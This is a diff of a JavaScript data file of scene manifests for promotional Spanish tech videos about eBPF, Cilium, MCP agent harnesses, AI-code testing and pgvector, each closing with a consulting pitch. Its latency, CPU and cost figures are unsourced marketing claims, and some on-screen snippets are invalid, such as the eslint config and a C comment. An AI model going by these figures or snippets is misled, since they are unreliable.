-            "title": "OPTIMIZACIÓN DE PIPELINES DE DATOS",
-            "cta": {
-              "badge": "AUDITORÍA DE COSTES (Link en perfil)",
-              "text": "Recorta hasta un 80% en tu infraestructura de analítica. Enlace directo en mi perfil."
-            }
+            "mode": "columnar",
+            "badge": "ZERO SERVIDORES",
+            "title": "ANALÍTICA IN-PROCESS",
+            "subtitle": "PARQUET + DUCKDB CORRIENDO EN TU PROPIA APP"
           }
         }
       ]
@@ -959,88 +825,65 @@ window.__BIBLIOTECA_2026__ = [
     "group": "04. EBPF LINUX KERNEL",
     "label": "Var A (Técnico): eBPF: Cómo el Kernel de Linux intercepta tráfico a velocidad hardware",
     "variation": "A (Técnico)",
-    "category": "SISTEMAS OPERATIVOS & OBSERVABILIDAD",
+    "category": "SISTEMAS Y REDES",
     "manifest": {
       "title": "[04] eBPF: Cómo el Kernel de Linux intercepta tráfico a velocidad hardware (Var A)",
-      "category": "SISTEMAS OPERATIVOS & OBSERVABILIDAD",
+      "category": "SISTEMAS Y REDES",
       "slug": "04_ebpf_linux_kernel",
       "variation": "A",
       "fps": 30,
       "scenes": [
         {
-          "id": "pipe_hook",
-          "type": "network_pipeline",
-          "duration": 6.5,
-          "voiceover": "¿Cómo monitorizar cada paquete de red a velocidad de silicio sin tocar una sola línea de código? Con eBPF en el Kernel de Linux.",
-          "visual_cue": "Apertura directa con pipeline visual mostrando intercepción en el kernel",
+          "id": "kernel_lead",
+          "type": "kernel_sandbox_viz",
+          "duration": 6,
+          "voiceover": "Cada vez que un paquete viaja de la tarjeta de red a tu aplicación en Node o Go, el kernel gasta miles de nanosegundos en context switches.",
+          "visual_cue": "Visualizador de privilegios Ring 3 (Userspace) vs Ring 0 (Kernel) y penalización de Syscalls",
           "props": {
-            "header": "ARQUITECTURA DE RED EN KERNEL",
-            "title": "INSPECCIÓN EN TIEMPO REAL SIN COPIAS",
-            "subtitle": "BYTECODE VERIFICADO EN LINUX",
+            "badge": "NIVEL DE PRIVILEGIO OS",
+            "title": "FRONTERA DE SYSCALLS",
+            "subtitle": "USERSPACE VS KERNEL SPACE EN LINUX"
+          }
+        },
+        {
+          "id": "packet_pipeline",
+          "type": "network_pipeline",
+          "duration": 6,
+          "voiceover": "Con eBPF inyectas programas verificados directo en el kernel. Los paquetes se filtran y enrutan en el driver de la tarjeta antes de tocar la pila de red.",
+          "visual_cue": "Tubería de red con hooks XDP procesando paquetes a velocidad de cable",
+          "props": {
+            "header": "ARQUITECTURA eBPF",
+            "title": "HOOKS DIRECTOS EN XDP / DRIVER",
+            "latency": "12 ns",
             "stages": [
               {
-                "id": "nic",
-                "label": "TARJETA DE RED (NIC)",
-                "sub": "Llegada de paquetes Ethernet",
-                "y": 220,
-                "color": "#06b6d4",
-                "metric": "40 Gbps"
+                "name": "NIC Driver (XDP)",
+                "tag": "Hardware hook"
               },
               {
-                "id": "ebpf",
-                "label": "EBPF PROGRAM (XDP)",
-                "sub": "Intercepción en Ring Buffer del Kernel",
-                "y": 520,
-                "color": "#f59e0b",
-                "metric": "0.005ms"
+                "name": "eBPF JIT Verifier",
+                "tag": "Ring 0 execution"
               },
               {
-                "id": "app",
-                "label": "USER SPACE RUNTIME",
-                "sub": "Solo recibe paquetes legítimos",
-                "y": 820,
-                "color": "#10b981",
-                "metric": "Cero CPU perdida"
+                "name": "Direct Packet Return",
+                "tag": "Bypass Userspace"
               }
             ]
           }
         },
         {
-          "id": "ebpf_code",
-          "type": "code_terminal",
-          "duration": 6,
-          "voiceover": "El verificador de Linux garantiza matemáticamente que el código eBPF nunca entrará en bucles infinitos ni causará un kernel panic.",
-          "visual_cue": "Terminal mostrando programa C en eBPF verificando cabeceras IP",
+          "id": "trace_terminal",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "Telemetría, seguridad Zero-Trust y balanceo de carga sin modificar una sola línea de tu código. Link en bio si quieres optimizar tu infraestructura Linux.",
+          "visual_cue": "Terminal mostrando bpftrace interceptando conexiones en tiempo real",
           "props": {
-            "header": "CÓDIGO DE KERNEL SEGURO",
-            "title": "HOOK DE RED CON XDP",
-            "filename": "kernel/filter.bpf.c",
-            "codeLines": [
-              "SEC(\"xdp\")",
-              "int filter_packets(struct xdp_md *ctx) {",
-              "  void *data = (void *)(long)ctx->data;",
-              "  void *data_end = (void *)(long)ctx->data_end;",
-              "  # Verificación estricta de límites por el kernel:",
-              "  if (data + sizeof(struct ethhdr) > data_end) return XDP_PASS;",
-              "  return XDP_DROP; // Bloqueo instantáneo en hardware",
-              "}"
-            ],
-            "cursorLine": 7
-          }
-        },
-        {
-          "id": "cta_ebpf",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Diseño arquitecturas de observabilidad y seguridad de bajo impacto en infraestructura Linux. Contáctame en el link de la bio.",
-          "visual_cue": "Cierre con consultoría de infraestructura y sistemas",
-          "props": {
-            "header": "CONSULTORÍA DE INFRAESTRUCTURA",
-            "title": "OBSERVABILIDAD Y SEGURIDAD EN LINUX",
-            "cta": {
-              "badge": "CONSULTORÍA LINUX (Link en bio)",
-              "text": "¿Problemas de rendimiento u observabilidad en Linux? Link en mi perfil para agendar una sesión."
-            }
+            "header": "CONSULTORÍA DE INFRAESTRUCTURA (Link en bio)",
+            "title": "OBSERVABILIDAD EN KERNEL",
+            "leftTitle": "BPFTRACE TELEMETRÍA",
+            "rightTitle": "BENEFICIOS DE RENDIMIENTO",
+            "leftText": "$ bpftrace -e \"kprobe:tcp_connect { printf(\"%s -> %d\\n\", comm, pid); }\"\nAttaching 1 probe...\nnode -> 4819 (10.0.1.4:443)\ncurl -> 4822 (10.0.1.8:80)",
+            "rightText": "• Cero sobrecarga de proxies sidecar\n• Latencia reducida en un 80%\n• Seguridad verificada a nivel de socket\n• Audita tus servidores: enlace en bio"
           }
         }
       ]
@@ -1052,60 +895,39 @@ window.__BIBLIOTECA_2026__ = [
     "group": "04. EBPF LINUX KERNEL",
     "label": "Var B (Polémico): Muerte a los Sidecars de Kubernetes: Por qué eBPF lo cambia todo",
     "variation": "B (Polémico)",
-    "category": "SISTEMAS OPERATIVOS & OBSERVABILIDAD",
+    "category": "SISTEMAS Y REDES",
     "manifest": {
       "title": "[04] Muerte a los Sidecars de Kubernetes: Por qué eBPF lo cambia todo (Var B)",
-      "category": "SISTEMAS OPERATIVOS & OBSERVABILIDAD",
+      "category": "SISTEMAS Y REDES",
       "slug": "04_ebpf_linux_kernel",
       "variation": "B",
       "fps": 30,
       "scenes": [
         {
-          "id": "sidecar_hook",
-          "type": "tradeoff_matrix",
-          "duration": 6.5,
-          "voiceover": "Meter un sidecar proxy en cada contenedor de Kubernetes duplica tu factura de memoria y añade latencia innecesaria. eBPF vino a matarlos.",
-          "visual_cue": "Apertura directa con tabla comparativa de Sidecars vs eBPF",
+          "id": "sidecar_death",
+          "type": "kernel_sandbox_viz",
+          "duration": 6,
+          "voiceover": "Los sidecars de Envoy en Kubernetes consumen hasta el veinticinco por ciento de tu CPU solo copiando paquetes entre userspace y kernel. eBPF los hace obsoletos.",
+          "visual_cue": "Visualizador del kernel mostrando el bypass de sidecars mediante eBPF",
           "props": {
-            "header": "SERVICE MESH OVERHEAD",
-            "title": "ENVOY SIDECARS VS CILIUM EBPF",
-            "colA": "CILIUM EBPF (KERNEL)",
-            "colB": "ISTIO / ENVOY SIDECAR",
-            "rows": [
-              {
-                "dim": "Memoria por Pod",
-                "a": "0 MB extra",
-                "b": "150-250 MB por pod",
-                "aGood": true
-              },
-              {
-                "dim": "Saltos TCP en Loopback",
-                "a": "0 hops (Socket direct)",
-                "b": "4 hops por petición",
-                "aGood": true
-              },
-              {
-                "dim": "Cifrado mTLS",
-                "a": "WireGuard en Kernel",
-                "b": "mTLS en User Space",
-                "aGood": true
-              }
-            ]
+            "badge": "ELIMINACIÓN DE SIDECARS",
+            "title": "BYPASS TOTAL DEL USERSPACE",
+            "subtitle": "CILIUM eBPF REEMPLAZANDO PROXIES PESADOS"
           }
         },
         {
-          "id": "cta_ebpf_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Audito la arquitectura de red y el gasto en clústeres de Kubernetes para eliminar fricción y sobrecostes. Enlace directo en mi perfil.",
-          "visual_cue": "Cierre con auditoría de infraestructura y clusters",
+          "id": "terminal_compare",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "Cilium reemplaza toda esa basura enrutando el tráfico directamente en el socket del kernel. Link en bio si quieres reducir costes de Kubernetes.",
+          "visual_cue": "Terminal comparando latencia y consumo de CPU: Istio vs Cilium eBPF",
           "props": {
-            "header": "AUDITORÍA DE INFRAESTRUCTURA",
-            "title": "OPTIMIZA TU CLÚSTER KUBERNETES",
-            "cta": {
-              "badge": "AUDITORÍA DE K8S (Link en perfil)",
-              "text": "Elimina sobrecargas en tus clústeres. Link en mi biografía para agendar tu diagnóstico."
-            }
+            "header": "AUDITORÍA DE KUBERNETES (Link en bio)",
+            "title": "CILIUM eBPF EN PRODUCCIÓN",
+            "leftTitle": "CONSUMO DE RECURSOS",
+            "rightTitle": "MÉTRICAS CLAVE",
+            "leftText": "ISTIO PROXIES: 24% CPU | 1.8 ms delay\nCILIUM eBPF:   2% CPU  | 0.2 ms delay\n✔ Ahorro de RAM: 3.2 GB por nodo",
+            "rightText": "• Reduce el gasto en clusters un 35%\n• Desaparecen los errores de timeout\n• Observabilidad nativa con Hubble\n• Contacto para asesoría en mi perfil"
           }
         }
       ]
@@ -1117,42 +939,55 @@ window.__BIBLIOTECA_2026__ = [
     "group": "05. MCP AGENT HARNESS",
     "label": "Var A (Técnico): Model Context Protocol (MCP): El estándar universal para IA y código",
     "variation": "A (Técnico)",
-    "category": "AI ENGINEERING & AGENT PROTOCOLS",
+    "category": "INTELIGENCIA ARTIFICIAL",
     "manifest": {
       "title": "[05] Model Context Protocol (MCP): El estándar universal para IA y código (Var A)",
-      "category": "AI ENGINEERING & AGENT PROTOCOLS",
+      "category": "INTELIGENCIA ARTIFICIAL",
       "slug": "05_mcp_agent_harness",
       "variation": "A",
       "fps": 30,
       "scenes": [
         {
-          "id": "mcp_hook",
-          "type": "architecture_flow",
-          "duration": 6.5,
-          "voiceover": "El prompt engineering murió. La verdadera ingeniería de IA conecta modelos directamente a tus bases de datos mediante Model Context Protocol.",
-          "visual_cue": "Apertura directa con arquitectura de protocolo cliente-servidor de herramientas",
+          "id": "mcp_lead",
+          "type": "quantization_weights_viz",
+          "duration": 6,
+          "voiceover": "Olvídate de pegar código a mano en el chat. Model Context Protocol es el estándar abierto que conecta modelos de IA con bases de datos, APIs y herramientas locales.",
+          "visual_cue": "Visualizador del protocolo MCP conectando el harness de agentes con herramientas del entorno",
           "props": {
-            "header": "ARQUITECTURA DE PROTOCOLO",
-            "title": "DESACOPLAMIENTO DE HERRAMIENTAS",
+            "mode": "mcp",
+            "badge": "ESTÁNDAR UNIVERSAL",
+            "title": "MODEL CONTEXT PROTOCOL (MCP)",
+            "subtitle": "COMUNICACIÓN TIPADA CLIENTE-SERVIDOR PARA AGENTES"
+          }
+        },
+        {
+          "id": "flow_mcp",
+          "type": "architecture_flow",
+          "duration": 6,
+          "voiceover": "Funciona como un Language Server Protocol: el modelo solicita herramientas y el servidor MCP ejecuta la acción de forma segura en tu máquina.",
+          "visual_cue": "Flujo de comunicación entre Claude / GPT, el arnés de MCP y las herramientas locales",
+          "props": {
+            "header": "CONTRATO DE HERRAMIENTAS",
+            "title": "ARQUITECTURA CLIENTE - SERVIDOR MCP",
             "nodes": [
               {
                 "id": "llm",
-                "label": "AGENTE / CLIENTE MCP",
-                "sublabel": "Claude Code · Cursor · Custom Runner",
+                "label": "MODELO DE IA (LLM)",
+                "sublabel": "Claude · GPT-4 · DeepSeek",
                 "color": "#a855f7",
                 "y": 160
               },
               {
-                "id": "protocol",
-                "label": "PROTOCOLO JSON-RPC 2.0",
-                "sublabel": "Capabilities Negotiation · Tools & Resources",
+                "id": "client",
+                "label": "MCP CLIENT (ARNÉS)",
+                "sublabel": "Validación de JSON-Schema y permisos",
                 "color": "#38bdf8",
                 "y": 520
               },
               {
                 "id": "servers",
-                "label": "SERVIDORES MCP AISLADOS",
-                "sublabel": "PostgreSQL · GitHub · Terminal Shell",
+                "label": "MCP SERVERS LOCALES",
+                "sublabel": "Postgres · Terminal · Git · FileSystem",
                 "color": "#10b981",
                 "y": 880
               }
@@ -1160,40 +995,18 @@ window.__BIBLIOTECA_2026__ = [
           }
         },
         {
-          "id": "mcp_terminal",
-          "type": "code_terminal",
-          "duration": 6,
-          "voiceover": "Un servidor MCP expone esquemas en JSON estricto. La IA invoca funciones con tipado seguro y maneja errores sin alucinaciones.",
-          "visual_cue": "Terminal mostrando definición de herramienta en servidor MCP con TypeScript",
+          "id": "terminal_mcp",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "Esto convierte a los modelos en agentes autónomos reales con límites de seguridad estrictos. Link en bio si quieres integrar IA en tu software de producción.",
+          "visual_cue": "Terminal mostrando ejecución de herramienta MCP con validación estricta de esquema",
           "props": {
-            "header": "ESPECIFICACIÓN DE HERRAMIENTAS",
-            "title": "SERVIDOR MCP EN TYPESCRIPT",
-            "filename": "mcp/database_server.ts",
-            "codeLines": [
-              "server.setRequestHandler(ListToolsRequestSchema, async () => ({",
-              "  tools: [{",
-              "    name: \"query_database\",",
-              "    description: \"Ejecuta consultas de solo lectura en Postgres\",",
-              "    inputSchema: zodToJsonSchema(QuerySchema)",
-              "  }]",
-              "}));"
-            ],
-            "cursorLine": 6
-          }
-        },
-        {
-          "id": "cta_mcp",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Diseño e integro agentes autónomos y servidores MCP para flujos empresariales complejos. Si buscas un desarrollador senior para liderar tu proyecto de IA, link en mi bio.",
-          "visual_cue": "Cierre con contratación senior backend / IA",
-          "props": {
-            "header": "DESARROLLO SENIOR BACKEND Y IA",
-            "title": "ARQUITECTURAS AGÉNTICAS A MEDIDA",
-            "cta": {
-              "badge": "STAFF ENGINEER (Link en bio)",
-              "text": "¿Necesitas integrar agentes de IA en tu infraestructura? Hablemos en el enlace de mi perfil."
-            }
+            "header": "DESARROLLO DE AGENTES (Link en bio)",
+            "title": "AGENTES DETERMINISTAS",
+            "leftTitle": "TRAZA JSON-RPC",
+            "rightTitle": "BENEFICIOS DE MCP",
+            "leftText": "--> tools/call {\"name\": \"query_db\", \"sql\": \"...\"}\n<-- tools/result {\"rows\": 4, \"time_ms\": 1.2}\n✔ Schema validado con Zod / JSON-Schema",
+            "rightText": "• Sin wrappers propietarios frágiles\n• Conecta cualquier modelo a tus datos\n• Ejecución local 100% segura\n• Construye agentes serios: link en bio"
           }
         }
       ]
@@ -1205,62 +1018,40 @@ window.__BIBLIOTECA_2026__ = [
     "group": "05. MCP AGENT HARNESS",
     "label": "Var B (Polémico): El \"Prompting\" ha muerto: Por qué la industria se mudó a los arneses de IA",
     "variation": "B (Polémico)",
-    "category": "AI ENGINEERING & AGENT PROTOCOLS",
+    "category": "INTELIGENCIA ARTIFICIAL",
     "manifest": {
       "title": "[05] El \"Prompting\" ha muerto: Por qué la industria se mudó a los arneses de IA (Var B)",
-      "category": "AI ENGINEERING & AGENT PROTOCOLS",
+      "category": "INTELIGENCIA ARTIFICIAL",
       "slug": "05_mcp_agent_harness",
       "variation": "B",
       "fps": 30,
       "scenes": [
         {
-          "id": "harness_hook",
-          "type": "terminal_split",
-          "duration": 6.5,
-          "voiceover": "Un prompt gigantesco no te dará software de producción. Lo que importa es el arnés de ejecución y el bucle de verificación de tests.",
-          "visual_cue": "Apertura directa con terminal comparando prompting ciego vs arnés determinista",
+          "id": "harness_diagram",
+          "type": "quantization_weights_viz",
+          "duration": 6,
+          "voiceover": "Intentar que una IA programe escribiéndole biblias de texto es una pérdida de tiempo. Los equipos serios usan arneses deterministas con MCP.",
+          "visual_cue": "Visualizador del harness de ingeniería conectando IA con herramientas estructuradas",
           "props": {
-            "header": "MÉTODO DE DESARROLLO",
-            "title": "PROMPT PURO VS BUCLE DE VERIFICACIÓN",
-            "termA": {
-              "title": "PROMPTING TRADICIONAL",
-              "color": "#ef4444",
-              "cmd": "chat_gpt(\"escribe un backend\")",
-              "status": "Alucinaciones en imports y dependencias",
-              "time": "Fallo silente",
-              "lines": [
-                "Genera 500 líneas de código sin verificar",
-                "Usa librerías deprecadas o inexistentes",
-                "Cero tests de ejecución"
-              ]
-            },
-            "termB": {
-              "title": "AGENT HARNESS DETERMINISTA",
-              "color": "#10b981",
-              "cmd": "agent run --verify --strict-sandbox",
-              "status": "Ejecuta tests y autocorrige en bucle",
-              "time": "Verificado",
-              "lines": [
-                "Llama a servidor MCP para validar esquema de DB",
-                "Corre suite de tests unitarios antes de commitear",
-                "Feedback loop determinista en tiempo real"
-              ]
-            }
+            "mode": "mcp",
+            "badge": "INGENIERÍA VS PROMPTING",
+            "title": "EL FIN DEL PROMPTING INFORMAL",
+            "subtitle": "HERRAMIENTAS ESTRUCTURADAS Y CONTRATOS ESTRICTOS"
           }
         },
         {
-          "id": "cta_mcp_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Construyo arneses de automatización e integraciones complejas para empresas. Si necesitas un ingeniero especializado en flujos de IA, link en mi biografía.",
-          "visual_cue": "Cierre con contratación directa senior",
+          "id": "terminal_eval",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "El arnés compila, corre los tests, lee los errores y le devuelve al modelo exactamente lo que necesita arreglar. Link en mi perfil para consultoría de IA.",
+          "visual_cue": "Terminal mostrando ciclo autónomo: código -> test fallido -> mutación -> test verde",
           "props": {
-            "header": "CONTRATACIÓN SENIOR BACKEND",
-            "title": "SISTEMAS AUTÓNOMOS Y AGENTES ROBUSTOS",
-            "cta": {
-              "badge": "LEAD DEVELOPER (Contacto en bio)",
-              "text": "Desarrollo de agentes y flujos autónomos de alta fiabilidad. Contáctame en mi biografía."
-            }
+            "header": "CONSULTORÍA EN IA (Link en bio)",
+            "title": "LOOP AUTÓNOMO DE VERIFICACIÓN",
+            "leftTitle": "EJECUCIÓN DEL ARNÉS",
+            "rightTitle": "RESULTADO DE CÓDIGO",
+            "leftText": "$ agent-harness run-task\n✔ Generando parche de código...\n✖ npm test falló: TypeError en auth.ts:42\n✔ Reintentando con contexto del error\n✔ npm test pasó al 100% (Green)",
+            "rightText": "• Cero alucinaciones sin verificar\n• Parches validados por tests antes de merge\n• Automatización real para equipos de software\n• Agenda tu sesión: enlace en mi perfil"
           }
         }
       ]
@@ -1335,17 +1126,17 @@ window.__BIBLIOTECA_2026__ = [
         },
         {
           "id": "cta_testing",
-          "type": "tradeoff_matrix",
+          "type": "terminal_split",
           "duration": 5,
           "voiceover": "Audito suites de prueba y diseño pipelines de verificación determinista para equipos de desarrollo. Link en mi perfil para agendar una sesión.",
-          "visual_cue": "Cierre con auditoría de calidad de software",
+          "visual_cue": "Terminal con informe de calidad de software y llamada a la acción",
           "props": {
-            "header": "AUDITORÍA DE CALIDAD Y TESTING",
+            "header": "AUDITORÍA DE CALIDAD (Link en bio)",
             "title": "BLINDA TU SOFTWARE EN PRODUCCIÓN",
-            "cta": {
-              "badge": "AUDITORÍA DE CALIDAD (Link en bio)",
-              "text": "¿Dudas de la fiabilidad de tu código autogenerado? Link en bio para auditar tus suites de prueba."
-            }
+            "leftTitle": "INSPECCIÓN DE TEST SUITE",
+            "rightTitle": "MÉTRICAS CLAVE",
+            "leftText": "$ npx stryker run --reporters html\n✔ Mutantes ejecutados: 482\n✔ Mutantes eliminados: 479 (99.3% score)\n✔ 0 falsos positivos en CI/CD",
+            "rightText": "• Detecta bugs antes de desplegar a usuarios\n• Pruebas automáticas con datos extremos\n• Verifica código autogenerado por IA\n• Agenda sesión: enlace en el perfil"
           }
         }
       ]
@@ -1366,28 +1157,6 @@ window.__BIBLIOTECA_2026__ = [
       "fps": 30,
       "scenes": [
         {
-          "id": "impact_hook_vibe",
-          "type": "kinetic_hook",
-          "duration": 4.5,
-          "voiceover": "Aceptar sugerencias de IA sin entender cómo funcionan no es programar rápido: es firmar una hipoteca de deuda técnica que vas a pagar muy cara.",
-          "visual_cue": "Tipografía de impacto gigante sin iconos genéricos",
-          "props": {
-            "layout": "impact",
-            "badge": "DEBATES DE LA INDUSTRIA",
-            "lines": [
-              {
-                "text": "\"VIBE CODING\" ES UNA",
-                "color": "#ffffff"
-              },
-              {
-                "text": "BOMBA DE TIEMPO",
-                "color": "#ef4444"
-              }
-            ],
-            "subtitle": "Deuda técnica acumulada a velocidad récord"
-          }
-        },
-        {
           "id": "split_vibe_vs_eng",
           "type": "terminal_split",
           "duration": 6,
@@ -1396,45 +1165,54 @@ window.__BIBLIOTECA_2026__ = [
           "props": {
             "header": "EL COSTE OCULTO",
             "title": "ILUSIÓN DE VELOCIDAD VS MANTENIMIENTO",
-            "termA": {
-              "title": "EQUIPO \"VIBE CODING\"",
-              "color": "#ef4444",
-              "cmd": "git commit -m \"parece que funciona en local\"",
-              "status": "32 dependencias fantasma añadidas",
-              "time": "Caída p99",
-              "lines": [
-                "Fugas de memoria silentes en event listeners",
-                "Nadie entiende el archivo de 1,200 líneas autogenerado",
-                "Tiempo de resolución de incidencias: 3 días"
-              ]
+            "leftTitle": "EQUIPO \"VIBE CODING\"",
+            "rightTitle": "INGENIERÍA RIGUROSA",
+            "leftText": "$ git push --force prod\n✖ Incidencia en vivo: Memory Leak en Worker\n✖ Nadie sabe qué hace el 80% del código\n✖ Coste de depuración: 3 días de caída",
+            "rightText": "$ npx test:e2e && npx typecheck\n✔ Contratos estrictos y tests de mutación\n✔ Tiempo de depuración: 4 minutos\n✔ Deuda técnica neutralizada"
+          }
+        },
+        {
+          "id": "metrics_debt",
+          "type": "metrics_comparison",
+          "duration": 5.5,
+          "voiceover": "Aceptar sugerencias de IA a ciegas acumula deuda técnica a una velocidad récord: el tiempo de depuración se multiplica por diez.",
+          "visual_cue": "Métricas comparativas de tiempo de depuración",
+          "props": {
+            "header": "TIEMPO DE RESOLUCIÓN DE INCIDENCIAS",
+            "metricA": {
+              "label": "VIBE CODING A CIEGAS",
+              "value": "14.5 horas",
+              "sub": "Código incomprensible sin tests",
+              "color": "#ef4444"
             },
-            "termB": {
-              "title": "INGENIERÍA RIGUROSA",
-              "color": "#10b981",
-              "cmd": "cargo test --all-features && cargo clippy",
-              "status": "Cero warnings, tipos estrictos y límites claros",
-              "time": "Estable 24/7",
-              "lines": [
-                "Invariantes de negocio validados en tipos estáticos",
-                "Arquitectura modular documentada y legible",
-                "Tiempo medio de recuperación: 5 minutos"
-              ]
+            "metricB": {
+              "label": "INGENIERÍA VERIFICADA",
+              "value": "18 minutos",
+              "sub": "Arquitectura tipada con límites claros",
+              "color": "#10b981"
             }
           }
         },
         {
-          "id": "cta_testing_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Ayudo a empresas a sanear bases de código y frenar la deuda técnica generada por IA. Contáctame en el enlace de mi perfil.",
-          "visual_cue": "Cierre con auditoría de deuda técnica",
+          "id": "cta_auditoria_vibe",
+          "type": "code_terminal",
+          "duration": 4,
+          "voiceover": "Si tu equipo tiene miedo de tocar su propio código, link en mi bio para auditar tu arquitectura y limpiar la deuda técnica acumulada.",
+          "visual_cue": "Terminal con linters estrictos y llamada a la acción en bio",
           "props": {
-            "header": "AUDITORÍA DE DEUDA TÉCNICA",
-            "title": "RECUPERA EL CONTROL DE TU CODEBASE",
-            "cta": {
-              "badge": "AUDITORÍA DE ARQUITECTURA (Contacto en bio)",
-              "text": "¿Tu codebase se volvió inmanejable? Hablemos en el link de la biografía."
-            }
+            "header": "AUDITORÍA DE ARQUITECTURA (Link en bio)",
+            "title": "REGLAS DE REFACTORIZACIÓN",
+            "filename": "eslint.config.js",
+            "codeLines": [
+              "// Enforcing architectural boundaries:",
+              "export default [",
+              "  rules: {",
+              "    \"@app/no-unverified-ai-code\": \"error\",",
+              "    \"@app/strict-mutation-threshold\": [\"error\", 85]",
+              "  }",
+              "];"
+            ],
+            "cursorLine": 4
           }
         }
       ]
@@ -1455,87 +1233,49 @@ window.__BIBLIOTECA_2026__ = [
       "fps": 30,
       "scenes": [
         {
-          "id": "hnsw_tree_hook",
-          "type": "tree_hierarchy",
+          "id": "hnsw_engine",
+          "type": "storage_engine_viz",
           "duration": 6.5,
-          "voiceover": "¿Cómo busca PostgreSQL entre un millón de vectores de IA en menos de cinco milisegundos? Con grafos HNSW navegables.",
-          "visual_cue": "Apertura directa con jerarquía de árbol navegable mostrando saltos hasta el vector",
+          "voiceover": "¿Cómo busca pgvector embeddings entre millones de documentos en dos milisegundos? Utiliza el algoritmo HNSW en memoria.",
+          "visual_cue": "Visualizador del grafo vectorial HNSW navegable en capas en la memoria de Postgres",
           "props": {
-            "header": "ALGORITMO HNSW",
-            "title": "HIERARCHICAL NAVIGABLE SMALL WORLD",
-            "complexity": "COMPLEJIDAD: O(log N) · DISTANCIA COSENO",
-            "nodes": [
-              {
-                "id": "top",
-                "label": "CAPA 2: SALTOS LARGOS",
-                "x": 480,
-                "y": 240,
-                "level": 0
-              },
-              {
-                "id": "mid1",
-                "label": "CAPA 1: CLUSTER A",
-                "x": 260,
-                "y": 520,
-                "level": 1,
-                "parent": "top"
-              },
-              {
-                "id": "mid2",
-                "label": "CAPA 1: CLUSTER B",
-                "x": 700,
-                "y": 520,
-                "level": 1,
-                "parent": "top"
-              },
-              {
-                "id": "leaf",
-                "label": "TARGET: SIMILARITY 0.94",
-                "x": 260,
-                "y": 840,
-                "level": 2,
-                "parent": "mid1",
-                "target": true
-              }
-            ],
-            "footerBadge": "RENDIMIENTO HNSW EN POSTGRES",
-            "footerText": "Recorre un grafo multidimensional en RAM sin escanear la tabla entera.",
-            "footerSubtext": "Búsqueda por similitud semántica en menos de 4 milisegundos."
+            "mode": "hnsw",
+            "badge": "ALGORITMO DE GRAFOS",
+            "title": "HNSW VECTORIAL EN MEMORIA",
+            "subtitle": "BÚSQUEDA POR SIMILITUD DE COSENOS EN POSTGRESQL"
           }
         },
         {
-          "id": "pg_sql",
-          "type": "code_terminal",
-          "duration": 6,
-          "voiceover": "Lo mejor es que puedes combinar búsqueda de similitud semántica con filtros relacionales clásicos en una sola consulta SQL transaccional.",
-          "visual_cue": "Terminal ejecutando query combinada en PostgreSQL con pgvector",
+          "id": "latency_hnsw",
+          "type": "latency_scale",
+          "duration": 5.5,
+          "voiceover": "Al estar en la misma base de datos relacional, el join entre el vector y los datos del usuario toma cero coma cinco milisegundos.",
+          "visual_cue": "Escala de latencia: join in-memory en Postgres vs llamada HTTP externa a Pinecone",
           "props": {
-            "header": "CONSULTA HÍBRIDA EN POSTGRES",
-            "title": "FILTRO RELACIONAL + VECTOR SEARCH",
-            "filename": "db/hybrid_search.sql",
-            "codeLines": [
-              "SELECT id, title, (embedding <=> $1) as distance",
-              "FROM articles",
-              "WHERE user_id = 42 AND published_at > NOW() - INTERVAL \"30 days\"",
-              "ORDER BY embedding <=> $1",
-              "LIMIT 5;",
-              "-- Ejecución: 3.8ms usando índice HNSW"
-            ],
-            "cursorLine": 5
+            "header": "MÉTRICA DE LATENCIA EN IA",
+            "title": "JOIN RELACIONAL VS LLAMADA EXTERNA",
+            "subtitle": "CONSULTA IN-PROCESS EN POSTGRES VS API VECTORIAL"
           }
         },
         {
-          "id": "cta_pgvector",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Si quieres implementar búsqueda semántica o auditar tu arquitectura de datos para IA sin sobrecostes innecesarios, link en mi perfil.",
-          "visual_cue": "Cierre con llamado a auditoría de bases de datos",
+          "id": "cta_vectordb",
+          "type": "metrics_comparison",
+          "duration": 5.5,
+          "voiceover": "Todo tu stack de IA cabe en Postgres con pgvector. Link en mi bio si quieres simplificar tu arquitectura y recortar costes innecesarios.",
+          "visual_cue": "Comparativa de costos: Pinecone dedicado vs Postgres unificado",
           "props": {
-            "header": "AUDITORÍA DE BASES DE DATOS & IA",
-            "title": "OPTIMIZA TUS PIPELINES DE EMBEDDINGS",
-            "cta": {
-              "badge": "AUDITORÍA DE DATOS (Link en bio)",
-              "text": "¿Búsquedas vectoriales lentas o caras? Hablemos en el enlace de mi perfil."
+            "header": "CONSULTORÍA EN BASES DE DATOS (Link en bio)",
+            "metricA": {
+              "label": "PINECONE + POSTGRES",
+              "value": "$1.450 / mes",
+              "sub": "Doble base de datos · Salto de red",
+              "color": "#ef4444"
+            },
+            "metricB": {
+              "label": "PGVECTOR UNIFICADO",
+              "value": "$85 / mes",
+              "sub": "Transacciones ACID · Joins inmediatos",
+              "color": "#10b981"
             }
           }
         }
@@ -1557,53 +1297,28 @@ window.__BIBLIOTECA_2026__ = [
       "fps": 30,
       "scenes": [
         {
-          "id": "sync_split_hook",
-          "type": "terminal_split",
-          "duration": 6.5,
-          "voiceover": "Te vendieron que necesitas Pinecone para hacer IA. Mantener dos bases de datos te obliga a sincronizar IDs y transacciones que siempre fallan.",
-          "visual_cue": "Apertura directa con terminal comparando sincronización dual problemática vs base única",
+          "id": "pinecone_shock",
+          "type": "latency_scale",
+          "duration": 5.5,
+          "voiceover": "Contratar una base de datos vectorial externa solo para guardar embeddings es el mayor error de arquitectura de 2026.",
+          "visual_cue": "Gráfica de latencia mostrando el salto de red de 85ms a Pinecone vs 3ms en Postgres",
           "props": {
-            "header": "COMPLEJIDAD OPERATIVA",
-            "title": "DOS BASES DE DATOS VS UNA SOLA",
-            "termA": {
-              "title": "POSTGRES + PINECONE EXTERNO",
-              "color": "#ef4444",
-              "cmd": "sync_worker.py (Sincronizando IDs)",
-              "status": "Inconsistencias cuando falla la red",
-              "time": "$340/mes extra",
-              "lines": [
